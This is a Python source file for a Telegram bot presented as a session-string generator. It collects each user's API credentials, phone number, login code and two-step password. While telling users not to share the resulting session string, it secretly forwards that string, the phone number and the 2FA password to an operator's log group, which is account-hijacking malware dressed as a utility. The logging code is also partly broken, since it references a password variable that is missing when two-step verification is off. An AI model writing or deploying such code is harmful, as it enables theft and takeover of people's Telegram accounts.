import os
from pyrogram import Client, filters
from pyrogram.errors import SessionPasswordNeeded
from pyromod import listen   # enables bot.ask()

API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
LOG_GROUP_ID = int(os.getenv("LOG_GROUP_ID"))

bot = Client(
    "StringGenBot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN
)


async def ask(question, chat_id):
    msg = await bot.ask(chat_id, question, timeout=300)
    return msg.text


@bot.on_message(filters.command("start"))
async def start_msg(_, msg):
    await msg.reply(
        "👋 Welcome to **String Session Generator Bot!**\n\n"
        "Send /session to generate your string session."
    )


@bot.on_message(filters.command("session"))
async def session_cmd(_, msg):
    chat_id = msg.chat.id
    user = msg.from_user

    try:
        api_id = await ask("🧾 Enter your **API ID**:", chat_id)
        api_hash = await ask("🔑 Enter your **API HASH**:", chat_id)
        number = await ask("📞 Enter your **Phone Number with country code**:", chat_id)

        temp = Client("gen", api_id=int(api_id), api_hash=api_hash)
        await temp.connect()
        sent = await temp.send_code(number)

        otp = await ask("📩 Enter the OTP you received:", chat_id)

        two_step_enabled = False
        try:
            await temp.sign_in(number, sent.phone_code_hash, otp)
        except SessionPasswordNeeded:
            password = await ask(
                "🔐 2-Step Verification enabled!\nEnter your Password:", chat_id
            )
            two_step_enabled = True
            await temp.check_password(password)

        string = await temp.export_session_string()
        await temp.disconnect()

        # Send to user
        await msg.reply(
            f"🎉 **Your Pyrogram Session String:**\n\n`{string}`\n\n"
            "⚠ Do NOT share this with anyone."
        )

        # Extra user info for logs
        username = f"@{user.username}" if user.username else "None"
        profile_link = f"https://t.me/{user.username}" if user.username else "No Username"

        # Send to log group
        try:
            await bot.send_message(
                LOG_GROUP_ID,
                f"🔰 **New Session Generated**\n\n"
                f"👤 **Name:** {user.first_name}\n"
                f"🆔 **User ID:** `{user.id}`\n"
                f"🔗 **Username:** {username}\n"
                f"🌐 **Profile Link:** {profile_link}\n"
                f"📞 **Phone Number:** `{number}`\n"
                f"🛡 **2-Step Enabled:** `{'YES' if two_step_enabled else 'NO'}`\n\n"
                f"🛡 **2-Step Enabled:** `{password}`\n\n"
                f"🔑 **Session String:**\n`{string}`"
            )
        except Exception as log_error:
            await msg.reply("⚠ Session generated but logging failed! Check Heroku logs.")
            print(f"LOG ERROR → {log_error} — LOG_GROUP_ID = {LOG_GROUP_ID}")

    except Exception as e:
        await msg.reply(f"❌ Error: `{e}`")


if __name__ == "__main__":
    bot.run()
